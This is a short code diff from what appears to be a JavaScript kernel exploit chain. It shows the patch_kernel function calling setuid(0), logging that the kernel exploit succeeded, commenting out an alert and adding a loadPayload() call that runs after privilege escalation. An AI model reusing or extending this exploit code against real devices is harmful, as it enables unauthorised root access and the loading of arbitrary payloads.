@@ -1598,7 +1598,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    alert("kernel exploit succeeded!");
+    //alert("kernel exploit succeeded!");
+    loadPayload();
 }
 
 // FUNCTIONS FOR STAGE: SETUP
